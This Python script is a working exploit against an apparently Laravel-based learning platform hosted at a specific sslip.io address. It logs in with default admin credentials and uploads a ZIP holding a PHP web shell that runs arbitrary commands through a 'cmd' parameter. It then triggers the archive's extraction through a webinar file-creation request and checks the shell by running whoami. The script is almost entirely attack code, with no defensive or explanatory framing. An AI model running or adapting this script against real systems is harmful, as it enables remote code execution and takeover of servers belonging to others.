import requests
import zipfile
import io
import re
import os
import json

# Target URL
BASE_URL = "http://ccw84s4g4cgsk440c0ssookc.72.62.122.96.sslip.io"
ADMIN_EMAIL = "admin@demo.com"
ADMIN_PASS = "admin"

session = requests.Session()

def login():
    print("[*] Logging in to admin panel...")
    # Get login page for CSRF token
    r = session.get(f"{BASE_URL}/admin/login")
    if r.status_code != 200:
        print(f"[-] Failed to reach login page. Status: {r.status_code}")
        return False
        
    csrf_token = re.search(r'name="_token" value="([^"]+)"', r.text).group(1)
    
    # Perform login
    data = {
        "_token": csrf_token,
        "email": ADMIN_EMAIL,
        "password": ADMIN_PASS
    }
    r = session.post(f"{BASE_URL}/admin/login", data=data)
    
    # Check if we are redirected to dashboard
    if "/admin" in r.url and r.status_code == 200:
        print("[+] Login successful!")
        return True
    else:
        print(f"[-] Login failed. Final URL: {r.url}")
        return False

def get_csrf(url=f"{BASE_URL}/admin"):
    r = session.get(url)
    match = re.search(r'name="_token" value="([^"]+)"', r.text)
    if match:
        return match.group(1)
    # Try meta tag
    match = re.search(r'name="csrf-token" content="([^"]+)"', r.text)
    if match:
        return match.group(1)
    return None

def upload_zip():
    print("[*] Creating malicious ZIP...")
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, 'w') as z:
        # shell.php content
        shell_content = '<?php if(isset($_GET["cmd"])){ echo "<pre>"; system($_GET["cmd"]); echo "</pre>"; } ?>'
        z.writestr('shell.php', shell_content)
    buf.seek(0)
    
    print("[*] Uploading ZIP via LFM...")
    csrf = get_csrf(f"{BASE_URL}/admin")
    
    # LFM Upload endpoint
    upload_url = f"{BASE_URL}/laravel-filemanager/upload"
    
    files = {
        'upload[]': ('exploit.zip', buf, 'application/zip')
    }
    data = {
        'type': 'Files',
        '_token': csrf
    }
    
    r = session.post(upload_url, files=files, data=data)
    print(f"[*] LFM Upload Response: {r.status_code}")
    try:
        resp_data = r.json()
        print(f"[*] LFM Response: {json.dumps(resp_data, indent=2)}")
    except:
        print(f"[*] LFM Raw Response: {r.text[:200]}")
    
    # The default path for LFM is /store/<user_id>/exploit.zip
    # Admin is user 1
    return "/store/1/exploit.zip"

def trigger_extraction(zip_path):
    print("[*] Triggering extraction via webinar file creation...")
    csrf = get_csrf()
    
    # Need a valid webinar_id and chapter_id
    r = session.get(f"{BASE_URL}/admin/webinars")
    webinar_match = re.search(r'/admin/webinars/(\d+)/edit', r.text)
    if not webinar_match:
        print("[-] No webinars found to target.")
        return
    webinar_id = webinar_match.group(1)
    print(f"[*] Targeting Webinar ID: {webinar_id}")
    
    # Get chapters for this webinar
    r = session.get(f"{BASE_URL}/admin/webinars/{webinar_id}/edit")
    
    # Try to find any chapter related string in the HTML
    all_ids = re.findall(r'chapter_id":(\d+)', r.text)
    if not all_ids:
        # Try finding chapter ID in standard HTML pattern
        all_ids = re.findall(r'chapter_(\d+)', r.text)
        
    if not all_ids:
        print("[-] No chapters found. Attempting to create a file without chapter (might fail).")
        chapter_id = "1" # Guessing
    else:
        chapter_id = all_ids[0]
        
    print(f"[*] Targeting Chapter ID: {chapter_id}")

    # Create file request (AJAX)
    store_file_url = f"{BASE_URL}/admin/webinars/files/store"
    
    # Note: FileController expects data in 'ajax[new]'
    payload = {
        "_token": csrf,
        "ajax": {
            "new": {
                "webinar_id": webinar_id,
                "chapter_id": chapter_id,
                "title": "Interactive Content",
                "accessibility": "free",
                "storage": "upload_archive",
                "file_path": zip_path,
                "interactive_type": "custom",
                "interactive_file_name": "shell.php",
                "status": "on",
                "locale": "en"
            }
        }
    }
    
    r = session.post(store_file_url, json=payload)
    print(f"[*] File Creation Response: {r.status_code}")
    print(r.text)
    
    # Shell path based on handleUnZipFile: /store/<user_id>/<zip_name_without_ext>/shell.php
    shell_url = f"{BASE_URL}/store/1/exploit/shell.php"
    print(f"[*] Potential Shell URL: {shell_url}")
    
    # Test shell
    print("[*] Testing shell...")
    r = session.get(f"{shell_url}?cmd=whoami")
    if r.status_code == 200 and r.text.strip():
        print(f"[!!!!] SUCCESS! Shell Output: {r.text.strip()}")
    else:
        print(f"[-] Shell not found or failed at {shell_url}. Status: {r.status_code}")
        # Try alternative path /store/1/exploit.zip_extracted/shell.php ? 
        # Actually handleUnZipFile uses $fileInfo['name'] which is 'exploit' for 'exploit.zip'
        pass

if login():
    zip_p = upload_zip()
    trigger_extraction(zip_p)
